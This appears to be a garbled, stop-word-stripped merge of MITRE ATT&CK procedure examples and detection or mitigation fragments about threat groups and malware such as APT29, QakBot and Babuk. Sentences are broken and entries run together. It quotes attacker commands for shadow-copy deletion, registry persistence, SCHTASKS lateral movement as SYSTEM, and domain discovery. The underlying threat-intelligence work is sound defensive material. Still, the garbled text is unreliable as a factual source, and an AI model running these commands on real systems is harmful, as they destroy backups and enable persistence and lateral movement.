APT27 December 2020) (Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) [HTTPBrowser](https://attack.mitre.org/software/S0070) DNS command control.(Citation: Dell TG-3390)(Citation: ThreatStream Evasion Analysis) [Pupy](https://attack.mitre.org/software/S0192) execute Lazagne [Mimikatz](https://attack.mitre.org/software/S0002) PowerShell.(Citation: GitHub Pupy) [Micropsia](https://attack.mitre.org/software/S0339) download execute executable C2 server.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [Cobalt Group](https://attack.mitre.org/groups/G0080) exploited multiple vulnerabilities execution, including Microsoft’s Equation Editor (CVE-2017-11882), Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, CVE-2017-8759.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: PTSecurity Cobalt Dec 2016)(Citation: Proofpoint Cobalt June 2017)(Citation: RiskIQ Cobalt Nov 2017)(Citation: RiskIQ Cobalt Jan 2018)(Citation: Crowdstrike Global Threat Report Feb 2018)(Citation: TrendMicro Cobalt Nov 2017) [Gazer](https://attack.mitre.org/software/S0168) establish persistence creating .lnk file Start menu modifying existing .lnk files execute malware cmd.exe.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) [TrickBot](https://attack.mitre.org/software/S0266) collects local files victim’s local machine.(Citation: S2 Grupo TrickBot June 2017) [Sandworm Team](https://attack.mitre.org/groups/G0034) <code>net use</code> connect network shares.(Citation: Dragos Crashoverride 2018)  [STARWHALE](https://attack.mitre.org/software/S1037) gather username infected host.(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022)  [PoetRAT](https://attack.mitre.org/software/S0428) delivered documents DDE execute malicious code.(Citation: Talos PoetRAT April 2020) [Remsec](https://attack.mitre.org/software/S0125) module default C2 port 13000.(Citation: Kaspersky ProjectSauron Technical Analysis) (Citation: Bizeul 2014) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors [PsExec](https://attack.mitre.org/software/S0029).(Citation: BlackBerry CostaRicto November 2020) [Comnie](https://attack.mitre.org/software/S0244) C2 communication.(Citation: Palo Alto Comnie) [Gold Dragon](https://attack.mitre.org/software/S0249) encrypts data Base64 command control server.(Citation: McAfee Gold Dragon) implementing WMI security filtering tailor users computers GPO apply to.(Citation: Wald0 Guide GPOs)(Citation: WMI Filters)(Citation: GPO Security Filtering) [Thrip](https://attack.mitre.org/groups/G0076) tools [Mimikatz](https://attack.mitre.org/software/S0002) [PsExec](https://attack.mitre.org/software/S0029).(Citation: Symantec Thrip June 2018) [Keydnap](https://attack.mitre.org/software/S0276) prompts users credentials.(Citation: synack 2016 review) [SDBbot](https://attack.mitre.org/software/S0461) ability download DLL C2 compromised host.(Citation: Proofpoint TA505 October 2019) Ensure proper user permissions prevent adversaries disabling interfering security/logging services. [APT29](https://attack.mitre.org/groups/G0016) TCP C2 communications.(Citation: FireEye APT29 Nov 2018) [APT38](https://attack.mitre.org/groups/G0082) brute force techniques attempt account access passwords unknown password hashes unavailable.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping account password gaining access additional systems enterprise network resources. functionality acquire credentials ways, including SAM table.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Oct 2015)(Citation: NCSC Joint Report Public Tools) [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) relied student target malicious document delivered email.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [Empire](https://attack.mitre.org/software/S0363) modules discover exploit path interception opportunities PATH environment variable.(Citation: Github PowerShell Empire) [Magic Hound](https://attack.mitre.org/groups/G0059) deleted overwrote files cover tracks.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018) Determine social media sites, personal webmail services, service spearphishing business operations blocking access activity monitored poses risk. [AppleSeed](https://attack.mitre.org/software/S0622) automatically collected data USB drives, keystrokes, screen images exfiltration.(Citation: KISA Operation Muzabi) [Mis-Type](https://attack.mitre.org/software/S0084) Base64 encoding C2 traffic.(Citation: Cylance Dust Storm) (Citation: Analyzing Solorigate Dec 2020) [CookieMiner](https://attack.mitre.org/software/S0492) download additional scripts server.(Citation: Unit42 CookieMiner Jan 2019) [TajMahal](https://attack.mitre.org/software/S0467) ability identify running processes plugins infected host.(Citation: Kaspersky TajMahal April 2019) (Citation: DFIR Report APT35 ProxyShell March 2022) [APT29](https://attack.mitre.org/groups/G0016) staged data files password-protected archives victim's OWA server.(Citation: Volexity SolarWinds) [Agent.btz](https://attack.mitre.org/software/S0092) drops removable media devices creates autorun.inf file instruction file. device inserted system, autorun.inf loads malware.(Citation: ThreatExpert Agent.btz) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [GoldenSpy](https://attack.mitre.org/software/S0493) included program "ExeProtector", monitors existence [GoldenSpy](https://attack.mitre.org/software/S0493) infected redownloads necessary.(Citation: Trustwave GoldenSpy June 2020)	 [MegaCortex](https://attack.mitre.org/software/S0576) disable services system.(Citation: IBM MegaCortex)  [Nltest](https://attack.mitre.org/software/S0359) enumerate trusted domains commands <code>nltest /domain_trusts</code>.(Citation: Nltest Manual)(Citation: Fortinet TrickBot) [Spark](https://attack.mitre.org/software/S0543) collect hostname, keyboard layout, language system.(Citation: Unit42 Molerat Mar 2020)  [Lazarus Group](https://attack.mitre.org/groups/G0032) malware KiloAlfa keylogging functionality.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Tools) [OilRig](https://attack.mitre.org/groups/G0049) brute force techniques credentials.(Citation: FireEye APT34 Webinar Dec 2017) [APT29](https://attack.mitre.org/groups/G0016) encoded PowerShell scripts uploaded [CozyCar](https://attack.mitre.org/software/S0046) installations download install [SeaDuke](https://attack.mitre.org/software/S0053). [APT29](https://attack.mitre.org/groups/G0016) PowerShell create tasks remote machines, identify configuration settings, evade defenses, exfiltrate data, execute commands.(Citation: Volexity SolarWinds)(Citation: Analyzing Solorigate Dec 2020)(Citation: Symantec Seaduke 2015)(Citation: Mandiant Easy Breach)(Citation: FireEye APT29 Nov 2018)(Citation: CrowdStrike StellarParticle January 2022)(Citation: ESET T3 Threat Report 2021)(Citation: Secureworks IRON HEMLOCK Profile) [Attor](https://attack.mitre.org/software/S0438) exfiltrated data C2 channel.(Citation: ESET Attor Oct 2019) [SpicyOmelette](https://attack.mitre.org/software/S0646) download malicious files threat actor controlled AWS URL's.(Citation: Secureworks GOLD KINGSWOOD September 2018) [OilRig](https://attack.mitre.org/groups/G0049) VBSscipt macros execution compromised hosts.(Citation: Check APT34 April 2021) Monitor executed commands arguments acquired Windows management tools Windows Management Instrumentation PowerShell. [QakBot](https://attack.mitre.org/software/S0650) ability capture session cookies.(Citation: Kroll Qakbot June 2020)(Citation: Kaspersky QakBot September 2021) [APT41](https://attack.mitre.org/groups/G0096) configured payloads load LD_PRELOAD.(Citation: Crowdstrike GTR2020 Mar 2020)	 [RawDisk](https://attack.mitre.org/software/S0364) access hard disk overwrite arbitrarily sized portions disk content.(Citation: Novetta Blockbuster Destructive Malware) Network prevention intrusion systems systems designed scan remove malicious downloads block activity. [Carbanak](https://attack.mitre.org/software/S0030) plugin VNC Ammyy Admin Tool.(Citation: FireEye CARBANAK June 2017) [KOCTOPUS](https://attack.mitre.org/software/S0669) attempt delete disable Registry scheduled tasks Security Defender Security Essentials.(Citation: MalwareBytes LazyScripter Feb 2021) multi-factor authentication. possible, enable multi-factor authentication externally facing services. [Cyclops Blink](https://attack.mitre.org/software/S0687) ability upload exfiltrated files C2 server.(Citation: NCSC Cyclops Blink February 2022) [Mori](https://attack.mitre.org/software/S1047) DNS tunneling communicate C2.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022) [Valak](https://attack.mitre.org/software/S0476) download module search build report harvested credential data.(Citation: SentinelOne Valak June 2020) initial beacon packet [S-Type](https://attack.mitre.org/software/S0085) operating version file victim.(Citation: Cylance Dust Storm) [Avenger](https://attack.mitre.org/software/S0473) identify domain compromised host.(Citation: Trend Micro Tick November 2019) Audit domain local accounts permission levels routinely situations adversary gain wide access obtaining credentials privileged account. (Citation: TechNet Credential Theft) (Citation: TechNet Privilege) audits include default accounts enabled, local accounts created authorized. Follow practices design administration enterprise network limit privileged account administrative tiers. (Citation: Securing Privileged Access) [jRAT](https://attack.mitre.org/software/S0283) support RDP control.(Citation: Kaspersky Adwind Feb 2016) [Inception](https://attack.mitre.org/groups/G0100) HTTP, HTTPS, WebDav network communications.(Citation: Kaspersky Cloud Atlas December 2014)(Citation: Unit 42 Inception November 2018) [Turla](https://attack.mitre.org/groups/G0010) JavaScript backdoor Google Apps Script C2 server.(Citation: ESET Turla Mosquito Jan 2018)(Citation: ESET Turla Mosquito 2018) [Ixeshe](https://attack.mitre.org/software/S0015) sets executable file's attributes hidden.(Citation: Trend Micro IXESHE 2012) [Molerats](https://attack.mitre.org/groups/G0021) phishing emails malicious links included.(Citation: Kaspersky MoleRATs April 2019) [Derusbi](https://attack.mitre.org/software/S0021) injects secure (SSH) process.(Citation: Airbus Derusbi 2015) [BBSRAT](https://attack.mitre.org/software/S0127) POST requests HTTPS command control commands send ZLIB compressed data C2 server.(Citation: Palo Alto Networks BBSRAT) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors batch files allowed establish persistence adding Registry key: `"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v COMSysApp /t REG_MULTI_SZ /d "COMSysApp" /f`.(Citation: McAfee Honeybee) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate obfuscation activity network level.  [WIRTE](https://attack.mitre.org/groups/G0090) network communication.(Citation: Lab52 WIRTE Apr 2019)	 [APT37](https://attack.mitre.org/groups/G0067) Windows DDE execution commands malicious VBS.(Citation: Securelist ScarCruft Jun 2016) [Sykipot](https://attack.mitre.org/software/S0018) <code>net view /domain</code> display hostnames systems network.(Citation: AlienVault Sykipot 2011) Monitor file systems moving, renaming, replacing, modifying DLLs. set DLLs loaded process (compared behavior) correlate software, patches, etc., suspicious. Modifications creation .manifest .local redirection files correlate software updates suspicious. [Grandoreiro](https://attack.mitre.org/software/S0531) block Deibold Warsaw GAS Tecnologia security tool firewall level.(Citation: ESET Grandoreiro April 2020) [Hydraq](https://attack.mitre.org/software/S0203) C2 traffic encrypted bitwise XOR operations.(Citation: Symantec Hydraq Jan 2010) [UPPERCUT](https://attack.mitre.org/software/S0275) capability gather victim's proxy information.(Citation: FireEye APT10 Sept 2018) [WastedLocker](https://attack.mitre.org/software/S0612) perform UAC bypass executed administrator rights infected host runs Windows Vista later.(Citation: NCC WastedLocker June 2020) [CloudDuke](https://attack.mitre.org/software/S0054) downloads executes additional malware address OneDrive account.(Citation: F-Secure Dukes) [SILENTTRINITY](https://attack.mitre.org/software/S0692) `System.Security.AccessControl` namespaces retrieve domain user information.(Citation: GitHub SILENTTRINITY Modules July 2019)   [Lazarus Group](https://attack.mitre.org/groups/G0032) malware list port choose port C2 traffic, creating port-protocol mismatches.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) sudoers file strictly edited passwords required users spawn risky processes users privilege. [Moses Staff](https://attack.mitre.org/groups/G1009) commercial tool DiskCryptor.(Citation: Checkpoint MosesStaff Nov 2021) [AutoIt backdoor](https://attack.mitre.org/software/S0129) C2 response base64-encoded.(Citation: Forcepoint Monsoon) [HermeticWizard](https://attack.mitre.org/software/S0698) list hardcoded credentials attempt authenticate SMB shares.(Citation: ESET Hermetic Wizard March 2022) [CrossRAT](https://attack.mitre.org/software/S0235) persistence Windows [Cobalt Strike](https://attack.mitre.org/software/S0154) native Windows Network Enumeration APIs interrogate discover targets Windows Active Directory network.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [APT32](https://attack.mitre.org/groups/G0050)'s macOS backdoor receive “delete” command.(Citation: ESET OceanLotus macOS April 2019) Monitor newly constructed network connections received untrusted hosts.  [Pasam](https://attack.mitre.org/software/S0208) creates backdoor remote attackers upload files.(Citation: Symantec Pasam 2012) [PLEAD](https://attack.mitre.org/software/S0435) executed malicious e-mail attachments.(Citation: TrendMicro BlackTech June 2017) Monitor Keychain Services API calls, legacy extensions <code>SecKeychainFindInternetPassword</code>, collect Keychain data acquire credentials.(Citation: Keychain Items Apple Dev API) principle privilege privileged accounts service account Kubernetes. [Blue Mockingbird](https://attack.mitre.org/groups/G0108) XMRIG cryptocurrency victim systems.(Citation: RedCanary Mockingbird 2020) Monitor SAM registry key dump created access stored account password hashes. hash dumpers local file device parse SAM table avoid file access defenses. in-memory SAM table reading hashes. Detection compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use adversaries well. [RDAT](https://attack.mitre.org/software/S0495) email attachments C2 communications.(Citation: Unit42 RDAT July 2020) [BBSRAT](https://attack.mitre.org/software/S0127) custom encryption algorithm data C2 server HTTP.(Citation: Palo Alto Networks BBSRAT) [OutSteel](https://attack.mitre.org/software/S1017) search specific file extensions, including zipped files.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Monitoring API calls generate data defense collected specific circumstances, benign API functions common difficult distinguish malicious behavior. Correlation events behavior surrounding API function calls API monitoring provide additional context event assist determining malicious behavior. Correlation activity process lineage process sufficient. Monitor modifications mechanisms trigger autostart execution, relevant additions Registry. [FYAnti](https://attack.mitre.org/software/S0628) search <code>C:\Windows\Microsoft.NET\</code> directory files size.(Citation: Securelist APT10 March 2021) [Rifdoor](https://attack.mitre.org/software/S0433) ability identify username compromised host.(Citation: Carbon Black HotCroissant April 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) malware base64-encoded commands files, encrypted embedded strings AES.(Citation: Unit 42 Magic Hound Feb 2017) [Magic Hound](https://attack.mitre.org/groups/G0059) malicious URL links email victims. URLs shortened linked Word documents malicious macros executed PowerShells scripts download [Pupy](https://attack.mitre.org/software/S0192).(Citation: Secureworks Cobalt Gypsy Feb 2017)(Citation: ClearSky Kittens 3 August 2020)(Citation: Certfa Charming Kitten January 2021) [Saint Bot](https://attack.mitre.org/software/S1018) virtual machine sandbox checks, including checking `Sbiedll.dll` list loaded modules, comparing machine `HAL9TH` user `JohnDoe`, checking BIOS version virtual machine identifiers.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) application control appropriate. [Xbash](https://attack.mitre.org/software/S0341) download additional malicious files C2 server.(Citation: Unit42 Xbash Sept 2018) [ShimRat](https://attack.mitre.org/software/S0444) communicated HTTPS C2 servers.(Citation: FOX-IT 2016 Mofang) Properly configure firewalls, application firewalls, proxies limit outgoing traffic sites services remote access tools. Protect generated event files stored locally proper permissions authentication limit opportunities adversaries increase privileges preventing Privilege Escalation opportunities.  [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors encrypted IP addresses "Agent" proxy hops RC4.(Citation: FoxIT Wocao December 2019) [Neoichor](https://attack.mitre.org/software/S0691) collect user victim's machine.(Citation: NICKEL December 2021) [Grandoreiro](https://attack.mitre.org/software/S0531) log keystrokes victim's machine.(Citation: ESET Grandoreiro April 2020) [BACKSPACE](https://attack.mitre.org/software/S0031) achieves persistence creating shortcut CSIDL_STARTUP directory.(Citation: FireEye APT30) [MechaFlounder](https://attack.mitre.org/software/S0459) ability commands compromised host.(Citation: Unit 42 MechaFlounder March 2019) (Citation: Überwachung APT28 Forfiles June 2015)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [UNC2452](https://attack.mitre.org/groups/G0118) <code>Get-AcceptedDomain</code> PowerShell cmdlet enumerate accepted domains Exchange Management Shell.(Citation: Volexity SolarWinds) [AdFind](https://attack.mitre.org/software/S0552) enumerate domains discover trust federated domains.(Citation: Deep Dive Solorigate January 2021) [SILENTTRINITY](https://attack.mitre.org/software/S0692) enumerate collect properties domain computers.(Citation: GitHub SILENTTRINITY Modules July 2019) [Saint Bot](https://attack.mitre.org/software/S1018) PowerShell execution.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) PowerShell script [RogueRobin](https://attack.mitre.org/software/S0270) payload obfuscated COMPRESS technique Invoke-Obfuscation.(Citation: Unit 42 DarkHydrus July 2018)(Citation: GitHub Invoke-Obfuscation) [LoudMiner](https://attack.mitre.org/software/S0451) automatically launch Linux virtual machine service startup AutoStart option enabled VBoxVmService configuration file.(Citation: ESET LoudMiner June 2019) (Citation: RSA2017 Detect Respond Adair) [QUADAGENT](https://attack.mitre.org/software/S0269) cmd.exe execute scripts commands victim’s machine.(Citation: Unit 42 QUADAGENT July 2018) [StoneDrill](https://attack.mitre.org/software/S0380) WMI command-line (WMIC) utility tasks.(Citation: Kaspersky StoneDrill 2017) [Tasklist](https://attack.mitre.org/software/S0057) enumerate security software running process products.(Citation: Tasklist) [LightNeuron](https://attack.mitre.org/software/S0395) ability download execute additional files.(Citation: ESET LightNeuron 2019) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [MuddyWater](https://attack.mitre.org/groups/G0069) techniques bypass UAC.(Citation: ClearSky MuddyWater Nov 2018) (Citation: PWC Cloud Hopper Technical Annex April 2017) [gh0st RAT](https://attack.mitre.org/software/S0032) checked existence Service key determine installed system.(Citation: Gh0stRAT ATT March 2019) [APT3](https://attack.mitre.org/groups/G0022) tool locate credentials files file Firefox Chrome.(Citation: Symantec Buckeye) [Kimsuky](https://attack.mitre.org/groups/G0094) pass hash authentication remote access software C2.(Citation: CISA AA20-301A Kimsuky) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors scheduled tasks execute batch scripts lateral movement command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC /TN /TR <Path Batch File> /ST <Time> /RU SYSTEM.`(Citation: Cybereason OperationCuckooBees 2022) [Industroyer](https://attack.mitre.org/software/S0604)’s 61850 payload component enumerates connected network adapters IP addresses.(Citation: ESET Industroyer) [Goopy](https://attack.mitre.org/software/S0477) ability enumerate infected system's user name.(Citation: Cybereason Cobalt Kitty 2017) Windows 8.1, Windows Server 2012 R2, versions, LSA Protected Process Light (PPL) setting Registry key <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code>, requires DLLs loaded LSA signed Microsoft. (Citation: Graeber 2014) (Citation: Configure LSA) [HAFNIUM](https://attack.mitre.org/groups/G0125) exfiltrated data file sharing sites, including MEGA.(Citation: HAFNIUM March 2020) Ensure authorized allowed access critical resources audit access lists regularly. Ensure proper network segmentation protect critical servers devices. [Naikon](https://attack.mitre.org/groups/G0019) malicious e-mail attachments deliver malware.(Citation: CheckPoint Naikon 2020) Periodically baseline cloud storage infrastructure identify malicious modifications additions. (Citation: Secureworks BRONZE BUTLER Oct 2017) [Hildegard](https://attack.mitre.org/software/S0601) collected host's OS, CPU, memory information.(Citation: Unit 42 Hildegard Malware) [Mosquito](https://attack.mitre.org/software/S0256) hijacking method persistence.(Citation: ESET Turla Mosquito Jan 2018) (Citation: Baumgartner Naikon 2015) [Cardinal RAT](https://attack.mitre.org/software/S0348) applies compression C2 traffic ZLIB library.(Citation: PaloAlto CardinalRat Apr 2017) [Rising Sun](https://attack.mitre.org/software/S0448) memory blog process overwriting junk bytes.(Citation: McAfee Sharpshooter December 2018)	 [Pupy](https://attack.mitre.org/software/S0192) keylogger capture keystrokes sends server stopped.(Citation: GitHub Pupy) [Dyre](https://attack.mitre.org/software/S0024) HTTPS C2 communications.(Citation: Symantec Dyre June 2015)(Citation: Malwarebytes Dyreza November 2015)	  [Carberp](https://attack.mitre.org/software/S0484) queried infected system's registry searching specific registry antivirus products.(Citation: Prevx Carberp March 2011) Monitor executed commands arguments employ time-based methods detect avoid virtualization analysis environments. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. [APT12](https://attack.mitre.org/groups/G0005) emails malicious Office documents PDFs attached.(Citation: Moran 2014)(Citation: Trend Micro IXESHE 2012) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors variety source tools, including JexBoss, KeeThief, [BloodHound](https://attack.mitre.org/software/S0521).(Citation: FoxIT Wocao December 2019) [njRAT](https://attack.mitre.org/software/S0385) port 1177 C2 communications.(Citation: Trend Micro njRAT 2018) [Babuk](https://attack.mitre.org/software/S0638) ability delete shadow volumes <code>vssadmin.exe delete shadows /all /quiet</code>.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021) [Confucius](https://attack.mitre.org/groups/G0142) file stealer examine drives, including drive.(Citation: TrendMicro Confucius APT Aug 2021) [BITTER](https://attack.mitre.org/groups/G1002) exploited CVE-2021-1732 privilege escalation.(Citation: DBAPPSecurity BITTER zero-day Feb 2021)(Citation: CVE-2021-1732 Feb 2021) Monitor executed commands arguments abuse Office "Office Test" Registry key persistence compromised system. [S-Type](https://attack.mitre.org/software/S0085) Base64 encoding C2 traffic.(Citation: Cylance Dust Storm) [VERMIN](https://attack.mitre.org/software/S0257) perform screen captures victim’s machine.(Citation: Unit 42 VERMIN Jan 2018) [njRAT](https://attack.mitre.org/software/S0385) configured spread removable drives.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018) [WindTail](https://attack.mitre.org/software/S0466) icons mimicking Office files mask payloads.(Citation: objective-see windtail1 dec 2018) [EVILNUM](https://attack.mitre.org/software/S0568) upload files C2 channel infected host.(Citation: Prevailion EvilNum 2020)  [Lazarus Group](https://attack.mitre.org/groups/G0032) malware sample encodes data base64.(Citation: McAfee Lazarus Resurfaces Feb 2018) [LAPSUS$](https://attack.mitre.org/groups/G1004) deleted target's systems resources cloud trigger organization's incident crisis response process.(Citation: MSTIC DEV-0537 Mar 2022) [BADFLICK](https://attack.mitre.org/software/S0642) searched files infected host.(Citation: Accenture MUDCARP March 2019) [Stuxnet](https://attack.mitre.org/software/S0603) communicate command control server. (Citation: Symantec W.32 Stuxnet Dossier) encryption layer security sensitive email. Encryption public key cryptography requires adversary private certificate encryption key decrypt messages. [MCMD](https://attack.mitre.org/software/S0500) named Readme.txt legitimate.(Citation: Secureworks MCMD July 2019) [Chimera](https://attack.mitre.org/groups/G0114) [ipconfig](https://attack.mitre.org/software/S0100), [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code> enumerate IP address network environment settings local host.(Citation: NCC Chimera January 2021) [Green Lambert](https://attack.mitre.org/software/S0690) multiple custom routines decrypt strings prior execution.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021) [Bandook](https://attack.mitre.org/software/S0234) delivered malicious Word document zip file.(Citation: CheckPoint Bandook Nov 2020) [Proton](https://attack.mitre.org/software/S0279) encrypted file store commands configuration values.(Citation: objsee mac malware 2017) [MoonWind](https://attack.mitre.org/software/S0149) obtains victim username.(Citation: Palo Alto MoonWind March 2017) [APT19](https://attack.mitre.org/groups/G0073) spearphishing emails malicious attachments RTF XLSM formats deliver initial exploits.(Citation: FireEye APT19) [WellMail](https://attack.mitre.org/software/S0515) identify IP address victim system.(Citation: CISA WellMail July 2020) [Machete](https://attack.mitre.org/groups/G0095) created scheduled tasks maintain [Machete](https://attack.mitre.org/software/S0409)'s persistence.(Citation: 360 Machete Sep 2020) Monitor logged network traffic response scan protocol header body values steal capabilities targeting. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Defense Evasion Command Control. Prevent creation network adapters possible.(Citation: GPO Bluetooth FEB 2009)(Citation: TechRepublic Wireless GPO FEB 2009) [SpeakUp](https://attack.mitre.org/software/S0374) attempts exploit vulnerabilities execute malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss 3/4/5/6, Hadoop YARN ResourceManager. (Citation: CheckPoint SpeakUp Feb 2019) [WINERACK](https://attack.mitre.org/software/S0219) create reverse utilizes statically-linked Wine cmd.exe code emulate Windows command prompt commands.(Citation: FireEye APT37 Feb 2018) settings prevent applications running downloaded Apple Store mitigate issues.  [APT41](https://attack.mitre.org/groups/G0096) <code>cmd.exe /c</code> execute commands remote machines.(Citation: FireEye APT41 Aug 2019)
[APT41](https://attack.mitre.org/groups/G0096) batch file install persistence [Cobalt Strike](https://attack.mitre.org/software/S0154) BEACON loader.(Citation: FireEye APT41 March 2020) [Ramsay](https://attack.mitre.org/software/S0458) detect information--including disk names, total space, remaining space--to create hardware profile GUID acts identifier operators.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [StrifeWater](https://attack.mitre.org/software/S1034) named `calc.exe` legitimate calculator program.(Citation: Cybereason StrifeWater Feb 2022) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [NavRAT](https://attack.mitre.org/software/S0247) copies running Internet Explorer process evade detection.(Citation: Talos NavRAT 2018) Ensure proper permissions set Registry hives prevent users modifying components lead privilege escalation. [Kimsuky](https://attack.mitre.org/groups/G0094) modified versions PHProxy examine traffic victim accessed website.(Citation: CISA AA20-301A Kimsuky) (Citation: Prevailion EvilNum 2020) difficult technique detect adversary traffic masked normal user traffic. Monitor [Process Injection](https://attack.mitre.org/techniques/T1055) browser applications. [RDFSNIFFER](https://attack.mitre.org/software/S0416) capability deleting local files.(Citation: FireEye FIN7 Oct 2019) [Misdat](https://attack.mitre.org/software/S0083) capable deleting Registry persistence.(Citation: Cylance Dust Storm) [SpicyOmelette](https://attack.mitre.org/software/S0646) identify IP compromised system.(Citation: Secureworks GOLD KINGSWOOD September 2018) Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. behavior endpoint successful compromise, abnormal behavior processes. include suspicious files written disk, evidence [Process Injection](https://attack.mitre.org/techniques/T1055) attempts hide execution evidence Discovery. monitoring presence loading (ex: Sysmon Event 6) vulnerable drivers adversaries drop exploit execute code kernel mode.(Citation: Driver Block Rules) privileges perform additional actions methods [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). additional activity adversary gained privileges. [POLONIUM](https://attack.mitre.org/groups/G1005) AirVPN service operational activity.(Citation: POLONIUM June 2022) [SUNBURST](https://attack.mitre.org/software/S0559) created VBScripts named existing services folders blend legitimate activities.(Citation: Deep Dive Solorigate January 2021)  [Hildegard](https://attack.mitre.org/software/S0601) downloaded scripts GitHub.(Citation: Unit 42 Hildegard Malware) [BlackEnergy](https://attack.mitre.org/software/S0089) 3 variant drops main DLL component creates .lnk shortcut file startup folder.(Citation: F-Secure BlackEnergy 2014) [Meteor](https://attack.mitre.org/software/S0688) attempt uninstall Kaspersky Antivirus remove Kaspersky license; add files folders attack Windows Defender exclusion list.(Citation: Check Meteor Aug 2021) [Babuk](https://attack.mitre.org/software/S0638) ability command control execution compromised hosts.(Citation: Sogeti CERT ESEC Babuk March 2021)(Citation: McAfee Babuk February 2021) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors watering hole attack popular software reseller exploit then-zero-day Internet Explorer vulnerability CVE-2014-0322.(Citation: Cylance Dust Storm) [Remsec](https://attack.mitre.org/software/S0125) network loader receive executable modules remote attackers local victim. upload download files HTTPS.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Technical Analysis) [Seasalt](https://attack.mitre.org/software/S0345) obfuscates configuration data.(Citation: Mandiant APT1 Appendix) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g. unauthorized, gratuitous, anomalous traffic patterns attempting access network configuration content) believed patch management anti-virus product commonly installed targeted companies distribute [Wiper](https://attack.mitre.org/software/S0041) malware.(Citation: Dell Wiper) [Ke3chang](https://attack.mitre.org/groups/G0004) dropped malware legitimate installed software paths including: `C:\ProgramFiles\Realtek\Audio\HDA\AERTSr.exe`, `C:\Program Files (x86)\Foxit Software\Foxit Reader\FoxitRdr64.exe`, `C:\Program Files (x86)\Adobe\Flash Player\AddIns\airappinstaller\airappinstall.exe`, `C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader\AcroRd64.exe`.(Citation: NICKEL December 2021) [FIN4](https://attack.mitre.org/groups/G0085) lured victims malicious links delivered spearphishing emails (often compromised accounts).(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [QakBot](https://attack.mitre.org/software/S0650) inject processes including explore.exe, Iexplore.exe, Mobsync.exe.(Citation: Trend Micro Qakbot 2020)(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Kaspersky QakBot September 2021) Monitor newly constructed files written extensions headers compressed encrypted file types. Detection efforts focus follow-on exfiltration activity, compressed encrypted files detected transit network intrusion detection data loss prevention analyzing file headers. [Carbanak](https://attack.mitre.org/software/S0030) logs key strokes configured processes sends C2 server.(Citation: Kaspersky Carbanak)(Citation: FireEye CARBANAK June 2017) [KONNI](https://attack.mitre.org/software/S0356) encrypted data files prior exfiltration.(Citation: Malwarebytes Konni Aug 2021) [FunnyDream](https://attack.mitre.org/software/S1044) ability gather user targeted `whoami/upn&whoami/fqdn&whoami/logonid&whoami/all`.(Citation: Bitdefender FunnyDream Campaign November 2020) Windows systems, monitor creation suspicious inbox rules <code>New-InboxRule</code> <code>Set-InboxRule</code> PowerShell cmdlets.(Citation: BEC Campaign) Monitor 2FA/MFA application logs suspicious events unusual login attempt source location, mismatch location login attempt smart device approving 2FA/MFA request prompts. [Turla](https://attack.mitre.org/groups/G0010) HTTPS C2 